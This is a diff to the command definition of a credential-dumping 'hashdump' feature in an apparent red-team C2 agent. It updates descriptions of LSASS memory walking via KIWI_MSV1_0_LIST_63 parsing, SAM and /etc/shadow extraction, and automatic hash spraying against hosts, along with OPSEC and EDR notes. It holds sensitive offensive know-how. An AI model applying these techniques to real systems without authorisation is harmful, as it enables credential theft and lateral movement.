@@ -13,7 +13,7 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "hashdump",
-		Description:         "Extract local account password hashes. Windows: NTLM hashes from SAM registry (requires SYSTEM), live logon session enumeration via LSA APIs (insitu, requires admin), or Phase 2B in-situ LSASS memory walk that pattern-scans lsasrv.dll for LogonSessionList and traverses the linked list (insitu-full, requires admin + PROCESS_VM_READ). Linux: hashes from /etc/shadow (requires root). macOS: hashes from Directory Services (requires root). Use 'auto-spray' action to dump hashes and automatically spray them against discovered hosts via cred-check.",
+		Description:         "Extract local account password hashes. Windows: NTLM hashes from SAM registry (requires SYSTEM), live logon session enumeration via LSA APIs (insitu, requires admin), or in-situ LSASS memory walk that pattern-scans lsasrv.dll for LogonSessionList, traverses the linked list, and overlays the KIWI_MSV1_0_LIST_63 layout on each node to extract LUID/UserName/Domain/AuthPackage/LogonType/Credentials-pointer (insitu-full, requires admin + PROCESS_VM_READ). Linux: hashes from /etc/shadow (requires root). macOS: hashes from Directory Services (requires root). Use 'auto-spray' action to dump hashes and automatically spray them against discovered hosts via cred-check.",
 		HelpString:          "hashdump [-format json]\nhashdump -action insitu\nhashdump -action insitu-full\nhashdump -action auto-spray [-targets 192.168.1.0/24,10.0.0.5]",
 		Version:             4,
 		Author:              "@galoryber",
@@ -38,7 +38,7 @@ func init() {
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Choices:          []string{"dump", "insitu", "insitu-full", "auto-spray"},
-				Description:      "dump: extract local hashes from SAM (requires SYSTEM, Windows only). insitu: enumerate active logon sessions via LSA APIs in-process (requires admin, Windows only). insitu-full: open lsass.exe with PROCESS_VM_READ, sigscan lsasrv.dll for LogonSessionList, walk the linked list, and cross-reference each node against Phase 1 LUIDs (requires admin, Windows only). auto-spray: dump hashes then spray them against target hosts via cred-check.",
+				Description:      "dump: extract local hashes from SAM (requires SYSTEM, Windows only). insitu: enumerate active logon sessions via LSA APIs in-process (requires admin, Windows only). insitu-full: open lsass.exe with PROCESS_VM_READ, sigscan lsasrv.dll for LogonSessionList, walk the linked list, and parse each node's KIWI_MSV1_0_LIST_63 fields (LUID, UserName, Domain, AuthPackage, LogonType, Credentials-pointer) — Win10 21H2 / Win11 23H2 layout (requires admin, Windows only). auto-spray: dump hashes then spray them against target hosts via cred-check.",
 				DefaultValue:     "dump",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: false, GroupName: "Default"},
@@ -83,7 +83,7 @@ func init() {
 			if action == "insitu" {
 				msg = "OPSEC WARNING: hashdump -action insitu calls LsaEnumerateLogonSessions/LsaGetLogonSessionData in-process. No remote handle to lsass.exe is opened (Phase 1 — LSA API only). Requires administrator privileges for full visibility across all sessions."
 			} else if action == "insitu-full" {
-				msg = "OPSEC WARNING: hashdump -action insitu-full opens lsass.exe with PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION and calls ReadProcessMemory across the lsasrv.dll image plus every walked LogonSessionList node. Process handle to LSASS is the highest-fidelity EDR signal available — equivalent to mimikatz/dumpit on most modern EDR. Requires administrator privileges (and SYSTEM if Credential Guard or LSA Protection is enabled). Walks lsasrv.dll signatures calibrated for Win10 21H2 — Win11 23H2; older builds may emit 'signature not found'."
+				msg = "OPSEC WARNING: hashdump -action insitu-full opens lsass.exe with PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION and calls ReadProcessMemory across the lsasrv.dll image, every walked LogonSessionList node, and every LSA_UNICODE_STRING.Buffer dereference for username/domain/auth-package strings. Process handle to LSASS is the highest-fidelity EDR signal available — equivalent to mimikatz/dumpit on most modern EDR. Requires administrator privileges (and SYSTEM if Credential Guard or LSA Protection is enabled). Signature + KIWI_MSV1_0_LIST_63 layout calibrated for Win10 21H2 — Win11 23H2; older builds may emit 'signature not found' or report walked nodes with empty parsed_username/parsed_domain (layout drift)."
 			} else {
 				msg = "OPSEC WARNING: hashdump reads SAM registry hive (Windows) or /etc/shadow (Linux). "
 				switch taskData.Payload.OS {
@@ -175,12 +175,12 @@ func init() {
 			}
 
 			if action == "insitu-full" {
-				display := "LSASS in-situ memory walk (Phase 2B: sigscan + LogonSessionList traversal)"
+				display := "LSASS in-situ memory walk (sigscan + LogonSessionList traversal + KIWI_MSV1_0_LIST_63 field parse)"
 				response.DisplayParams = &display
 				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
 					TaskID:           taskData.Task.ID,
 					BaseArtifactType: "API Call",
-					ArtifactMessage:  "OpenProcess(lsass.exe, PROCESS_VM_READ|PROCESS_QUERY_LIMITED_INFORMATION) + ReadProcessMemory across lsasrv.dll image + every walked LogonSessionList node (mimikatz signature_x64_w8 pattern)",
+					ArtifactMessage:  "OpenProcess(lsass.exe, PROCESS_VM_READ|PROCESS_QUERY_LIMITED_INFORMATION) + ReadProcessMemory across lsasrv.dll image + every walked LogonSessionList node + every LSA_UNICODE_STRING.Buffer dereference for username/domain/auth-package strings (mimikatz signature_x64_w8 + KIWI_MSV1_0_LIST_63 layout)",
 				})
 				return response
 			}
